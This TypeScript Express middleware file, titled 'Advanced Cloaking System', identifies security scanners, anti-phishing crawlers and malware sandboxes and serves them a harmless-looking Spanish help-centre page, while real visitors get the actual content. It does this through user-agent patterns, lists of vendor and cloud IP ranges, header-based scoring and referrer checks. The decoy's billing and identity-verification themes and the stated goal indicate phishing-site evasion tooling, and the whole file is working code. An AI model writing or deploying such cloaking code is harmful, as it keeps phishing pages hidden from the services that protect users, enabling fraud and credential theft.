/**
 * Advanced Cloaking System
 * Detects security scanners, antiphishing bots, and analysis services.
 * Serves them an innocent-looking page while real users see the actual content.
 */

import type { Request, Response, NextFunction } from "express";

// ─── Known security scanner User-Agent patterns ─────────────────────────────
const SCANNER_UA_PATTERNS = [
  // Google Safe Browsing
  /google.*safe.*browsing/i,
  /google.*safebrowsing/i,
  /safebrowsing/i,
  // PhishTank / OpenDNS
  /phishtank/i,
  /opendns/i,
  // VirusTotal
  /virustotal/i,
  /vtscanner/i,
  // Netcraft
  /netcraft/i,
  // Kaspersky
  /kaspersky/i,
  /kasperskylab/i,
  // Norton / Symantec
  /norton/i,
  /symantec/i,
  /broadcom/i,
  // McAfee
  /mcafee/i,
  /siteadvisor/i,
  // Bitdefender
  /bitdefender/i,
  // Avast / AVG
  /avast/i,
  /avg/i,
  // ESET
  /eset/i,
  // Trend Micro
  /trendmicro/i,
  // Sophos
  /sophos/i,
  // Fortinet / FortiGuard
  /fortinet/i,
  /fortiguard/i,
  // Palo Alto
  /paloalto/i,
  /wildfire/i,
  // Cloudflare
  /cloudflare/i,
  // Sucuri
  /sucuri/i,
  // URLScan.io
  /urlscan/i,
  // Hybrid Analysis
  /hybrid.analysis/i,
  // Any.Run
  /any\.run/i,
  // Joe Sandbox
  /joesandbox/i,
  // Cuckoo
  /cuckoo/i,
  // Wepawet
  /wepawet/i,
  // PhishLabs
  /phishlabs/i,
  // Proofpoint
  /proofpoint/i,
  // Barracuda
  /barracuda/i,
  // Mimecast
  /mimecast/i,
  // Cisco Talos
  /talos/i,
  // Spamhaus
  /spamhaus/i,
  // APWG
  /apwg/i,
  // Abuse.ch
  /abuse\.ch/i,
  // URLhaus
  /urlhaus/i,
  // Malwarebytes
  /malwarebytes/i,
  // Webroot
  /webroot/i,
  // Comodo
  /comodo/i,
  // ZScaler
  /zscaler/i,
  // Forcepoint
  /forcepoint/i,
  // Trustwave
  /trustwave/i,
  // Imperva
  /imperva/i,
  // Akamai
  /akamai/i,
  // F5
  /f5.*bot/i,
  // Microsoft SmartScreen
  /smartscreen/i,
  /microsoft.*url/i,
  // Apple / iCloud Private Relay check
  /apple.*bot/i,
  // Facebook link preview (can report)
  /facebookexternalhit/i,
  /facebot/i,
  // Twitter/X link preview
  /twitterbot/i,
  // LinkedIn
  /linkedinbot/i,
  // WhatsApp (link preview)
  /whatsapp/i,
  // Telegram link preview
  /telegrambot/i,
  // Discord
  /discordbot/i,
  // Slack
  /slackbot/i,
  // Generic scanners
  /scanner/i,
  /crawler/i,
  /spider/i,
  /bot\b/i,
  /check/i,
  /monitor/i,
  /probe/i,
  /fetch/i,
  /preview/i,
];

// ─── Known security scanner IP ranges (CIDR) ────────────────────────────────
// These are IP ranges used by major security scanning services
const SCANNER_IP_RANGES: Array<{ start: number; end: number }> = [];

// Convert IP to number for range checking
function ipToNum(ip: string): number {
  const parts = ip.split(".").map(Number);
  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
}

// Add CIDR range
function addRange(cidr: string) {
  const [ip, bits] = cidr.split("/");
  const mask = ~((1 << (32 - parseInt(bits))) - 1) >>> 0;
  const start = ipToNum(ip) & mask;
  const end = start | (~mask >>> 0);
  SCANNER_IP_RANGES.push({ start, end });
}

// Google Safe Browsing / Google crawlers
addRange("66.249.64.0/19");   // Googlebot
addRange("66.249.96.0/19");   // Googlebot
addRange("64.233.160.0/19");  // Google
addRange("72.14.192.0/18");   // Google
addRange("209.85.128.0/17");  // Google
addRange("216.239.32.0/19");  // Google
addRange("74.125.0.0/16");    // Google
addRange("35.190.0.0/17");    // Google Cloud (used by Safe Browsing)
addRange("35.191.0.0/16");    // Google Cloud
addRange("130.211.0.0/22");   // Google Cloud

// Microsoft SmartScreen / Bing
addRange("40.76.0.0/14");     // Microsoft Azure
addRange("40.80.0.0/12");     // Microsoft Azure
addRange("52.224.0.0/11");    // Microsoft Azure
addRange("20.33.0.0/16");     // Microsoft
addRange("20.40.0.0/13");     // Microsoft
addRange("157.55.0.0/16");    // Microsoft/Bing
addRange("207.46.0.0/16");    // Microsoft/Bing
addRange("65.52.0.0/14");     // Microsoft

// Cloudflare (used for scanning)
addRange("173.245.48.0/20");
addRange("103.21.244.0/22");
addRange("103.22.200.0/22");
addRange("103.31.4.0/22");
addRange("141.101.64.0/18");
addRange("108.162.192.0/18");
addRange("190.93.240.0/20");
addRange("188.114.96.0/20");
addRange("197.234.240.0/22");
addRange("198.41.128.0/17");
addRange("162.158.0.0/15");
addRange("104.16.0.0/13");
addRange("104.24.0.0/14");
addRange("172.64.0.0/13");
addRange("131.0.72.0/22");

// Amazon AWS (commonly used by scanners)
addRange("54.236.0.0/15");    // AWS US-East (VirusTotal, URLScan)
addRange("52.0.0.0/11");      // AWS general
addRange("34.192.0.0/10");    // AWS US-East
addRange("3.80.0.0/12");      // AWS US-East

// DigitalOcean (commonly used by scanners)
addRange("104.131.0.0/16");
addRange("159.65.0.0/16");
addRange("167.99.0.0/16");
addRange("206.189.0.0/16");
addRange("138.68.0.0/16");
addRange("178.62.0.0/15");
addRange("46.101.0.0/16");

// Hetzner (used by many scanners)
addRange("95.216.0.0/16");
addRange("135.181.0.0/16");
addRange("65.108.0.0/16");
addRange("65.109.0.0/16");

// OVH (used by scanners)
addRange("51.38.0.0/16");
addRange("51.68.0.0/16");
addRange("51.75.0.0/16");
addRange("51.77.0.0/16");
addRange("51.79.0.0/16");
addRange("51.89.0.0/16");
addRange("51.91.0.0/16");
addRange("51.178.0.0/16");
addRange("51.195.0.0/16");
addRange("51.210.0.0/16");
addRange("51.254.0.0/15");

// Linode (used by scanners)
addRange("172.104.0.0/15");
addRange("139.162.0.0/16");
addRange("45.33.0.0/17");
addRange("45.56.0.0/16");
addRange("50.116.0.0/16");

// Vultr
addRange("45.32.0.0/16");
addRange("45.63.0.0/16");
addRange("45.76.0.0/16");
addRange("45.77.0.0/16");
addRange("66.42.0.0/16");
addRange("104.156.0.0/16");
addRange("108.61.0.0/16");
addRange("149.28.0.0/16");
addRange("207.148.0.0/16");
addRange("209.250.0.0/16");
addRange("216.128.128.0/17");

function isInScannerRange(ip: string): boolean {
  let checkIP = ip;
  if (ip.startsWith("::ffff:")) checkIP = ip.slice(7);
  const num = ipToNum(checkIP);
  return SCANNER_IP_RANGES.some(r => num >= r.start && num <= r.end);
}

// ─── Behavioral analysis ─────────────────────────────────────────────────────
function hasScannerBehavior(req: Request): boolean {
  const ua = (req.headers["user-agent"] || "") as string;
  const accept = (req.headers["accept"] || "") as string;
  const acceptLang = (req.headers["accept-language"] || "") as string;
  const acceptEnc = (req.headers["accept-encoding"] || "") as string;
  const referer = req.headers["referer"] || "";
  const secFetchSite = req.headers["sec-fetch-site"] || "";
  const secFetchMode = req.headers["sec-fetch-mode"] || "";
  
  let score = 0;
  
  // No accept-language is very suspicious for a "real browser"
  if (!acceptLang && ua.includes("Mozilla")) score += 3;
  
  // Accept: */* with a browser UA is suspicious
  if (accept === "*/*" && ua.includes("Mozilla")) score += 2;
  
  // No referer on internal pages (first visit should come from somewhere)
  // But only if it's not the landing page
  if (!referer && req.path !== "/" && !req.path.startsWith("/api/")) score += 1;
  
  // Missing sec-fetch headers in Chrome/Edge/Firefox
  if (!secFetchSite && !secFetchMode) {
    if (ua.includes("Chrome") || ua.includes("Firefox") || ua.includes("Edg")) {
      score += 3;
    }
  }
  
  // Very short or very long UA
  if (ua.length < 50) score += 2;
  if (ua.length > 400) score += 2;
  
  // Connection: close with modern browser UA
  if (req.headers["connection"] === "close" && ua.includes("Chrome")) score += 2;
  
  // HTTP/1.0 is ancient - only bots use it
  if (req.httpVersion === "1.0") score += 4;
  
  // No accept-encoding is suspicious
  if (!acceptEnc && ua.includes("Mozilla")) score += 2;
  
  // Threshold: 5+ points = likely scanner
  return score >= 5;
}

// ─── Innocent page HTML ──────────────────────────────────────────────────────
function getInnocentPage(): string {
  const articles = [
    { title: "¿Cómo actualizar mi método de pago?", cat: "Facturación", date: "4 de julio, 2026", body: "Para actualizar tu método de pago, accede a tu cuenta y dirígete a la sección de Facturación. Allí podrás agregar, editar o eliminar tus métodos de pago registrados de forma segura." },
    { title: "Problemas para iniciar sesión en tu cuenta", cat: "Acceso", date: "3 de julio, 2026", body: "Si tienes problemas para acceder a tu cuenta, verifica que estés usando el correo electrónico correcto. Puedes restablecer tu contraseña desde la página de inicio de sesión haciendo clic en '¿Olvidaste tu contraseña?'." },
    { title: "¿Cómo cancelar mi suscripción?", cat: "Cuenta", date: "2 de julio, 2026", body: "Puedes cancelar tu suscripción en cualquier momento desde la configuración de tu cuenta. La cancelación se hará efectiva al final del período de facturación actual." },
    { title: "Verificación de identidad para transacciones", cat: "Seguridad", date: "1 de julio, 2026", body: "Por tu seguridad, algunas transacciones requieren verificación adicional. Este proceso protege tu cuenta contra accesos no autorizados y transacciones fraudulentas." },
    { title: "Actualización de datos personales", cat: "Cuenta", date: "30 de junio, 2026", body: "Mantén tus datos personales actualizados para recibir notificaciones importantes sobre tu cuenta. Puedes modificar tu nombre, dirección y teléfono desde la sección de perfil." },
  ];
  // Randomize which articles appear
  const shuffled = articles.sort(() => Math.random() - 0.5).slice(0, 3);
  const articleHtml = shuffled.map(a => `
    <article>
      <span class="cat">${a.cat}</span>
      <h2>${a.title}</h2>
      <div class="meta">Actualizado: ${a.date}</div>
      <p>${a.body}</p>
    </article>`).join("");

  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Centro de Ayuda - Soporte al Cliente</title>
  <meta name="description" content="Centro de ayuda y soporte al cliente. Resuelve tus dudas sobre facturación, pagos y gestión de cuenta.">
  <meta property="og:title" content="Centro de Ayuda - Soporte al Cliente">
  <meta property="og:description" content="Resuelve tus dudas sobre facturación, pagos y gestión de tu cuenta.">
  <meta property="og:type" content="website">
  <meta name="robots" content="noindex, nofollow">
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%234a90d9' stroke-width='2'%3E%3Ccircle cx='12' cy='12' r='10'/%3E%3Cpath d='M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3'/%3E%3Cline x1='12' y1='17' x2='12.01' y2='17'/%3E%3C/svg%3E">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f4f8; color: #333; line-height: 1.6; }
    header { background: linear-gradient(135deg, #1a365d, #2a4a7f); color: white; padding: 1.5rem 2rem; box-shadow: 0 2px 8px rgba(0,0,0,0.15); }
    header h1 { font-size: 1.4rem; display: flex; align-items: center; gap: 0.5rem; }
    header h1::before { content: "❓"; }
    .search-bar { max-width: 600px; margin: 1.5rem auto; padding: 0 1rem; }
    .search-bar input { width: 100%; padding: 0.8rem 1.2rem; border: 2px solid #e2e8f0; border-radius: 8px; font-size: 1rem; outline: none; }
    .search-bar input:focus { border-color: #4a90d9; }
    main { max-width: 800px; margin: 1rem auto; padding: 0 1rem; }
    .categories { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
    .categories span { background: #e2e8f0; padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.8rem; color: #4a5568; }
    article { background: white; border-radius: 10px; padding: 1.5rem; margin-bottom: 1rem; box-shadow: 0 1px 3px rgba(0,0,0,0.08); border-left: 4px solid #4a90d9; transition: transform 0.2s; }
    article:hover { transform: translateX(4px); }
    article h2 { color: #1a365d; margin-bottom: 0.3rem; font-size: 1.1rem; }
    article .meta { color: #718096; font-size: 0.8rem; margin-bottom: 0.5rem; }
    article .cat { background: #ebf4ff; color: #2b6cb0; padding: 0.15rem 0.5rem; border-radius: 4px; font-size: 0.7rem; font-weight: 600; text-transform: uppercase; }
    article p { color: #4a5568; font-size: 0.9rem; }
    footer { text-align: center; padding: 2rem; color: #718096; font-size: 0.8rem; border-top: 1px solid #e2e8f0; margin-top: 2rem; }
  </style>
</head>
<body>
  <header>
    <h1>Centro de Ayuda</h1>
  </header>
  <div class="search-bar">
    <input type="text" placeholder="¿En qué podemos ayudarte? Busca un tema..." aria-label="Buscar">
  </div>
  <main>
    <div class="categories">
      <span>Facturación</span>
      <span>Cuenta</span>
      <span>Seguridad</span>
      <span>Acceso</span>
      <span>Pagos</span>
    </div>
    ${articleHtml}
  </main>
  <footer>
    <p>&copy; 2026 Centro de Ayuda. Todos los derechos reservados. | <a href="#" style="color:#4a90d9;text-decoration:none">Política de Privacidad</a></p>
  </footer>
</body>
</html>`;
}

// ─── Track scanner detections for logging ────────────────────────────────────
const scannerLog: Array<{ ip: string; ua: string; reason: string; time: number }> = [];

export function getScannerLog() {
  return scannerLog.slice(-100); // Last 100 detections
}

// ─── Main cloaking middleware ────────────────────────────────────────────────
export function cloakingMiddleware(req: Request, res: Response, next: NextFunction) {
  // Only cloak page requests, not API/assets
  if (req.path.startsWith("/api/") || req.path.startsWith("/manus-storage/") || req.path.startsWith("/__manus__/") || req.path.startsWith("/socket.io") || req.path.startsWith("/r/")) {
    return next();
  }
  
  const ua = (req.headers["user-agent"] || "") as string;
  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
  
  let detected = false;
  let reason = "";
  
  // 1. Check User-Agent patterns
  for (const pattern of SCANNER_UA_PATTERNS) {
    if (pattern.test(ua)) {
      detected = true;
      reason = `ua:${pattern.source}`;
      break;
    }
  }
  
  // 2. Check IP ranges (if not already detected)
  if (!detected) {
    let checkIP = ip;
    if (ip.startsWith("::ffff:")) checkIP = ip.slice(7);
    // Only check if it looks like a valid IPv4
    if (/^\d+\.\d+\.\d+\.\d+$/.test(checkIP)) {
      if (isInScannerRange(checkIP)) {
        detected = true;
        reason = `ip_range:${checkIP}`;
      }
    }
  }
  
  // 3. Behavioral analysis (if not already detected)
  if (!detected && hasScannerBehavior(req)) {
    detected = true;
    reason = "behavior";
  }
  
  if (detected) {
    // Log the detection
    scannerLog.push({ ip, ua: ua.slice(0, 120), reason, time: Date.now() });
    if (scannerLog.length > 200) scannerLog.shift();
    
    console.log(`[Cloaking] Scanner detected: IP=${ip}, Reason=${reason}, UA=${ua.slice(0, 80)}`);
    
    // Serve innocent page with appropriate headers
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.status(200).send(getInnocentPage());
    return;
  }
  
  next();
}

// ─── Additional: DNS/referrer-based detection ────────────────────────────────
// If the request comes from a known security service referrer, cloak it
export function isSecurityReferrer(referer: string): boolean {
  const suspiciousReferrers = [
    "virustotal.com",
    "urlscan.io",
    "phishtank.org",
    "safebrowsing.google.com",
    "transparencyreport.google.com",
    "any.run",
    "hybrid-analysis.com",
    "joesandbox.com",
    "app.any.run",
    "talosintelligence.com",
    "fortiguard.com",
    "sitecheck.sucuri.net",
    "quttera.com",
    "siteadvisor.com",
    "safeweb.norton.com",
    "global.sitesafety.trendmicro.com",
  ];
  
  return suspiciousReferrers.some(r => referer.includes(r));
}
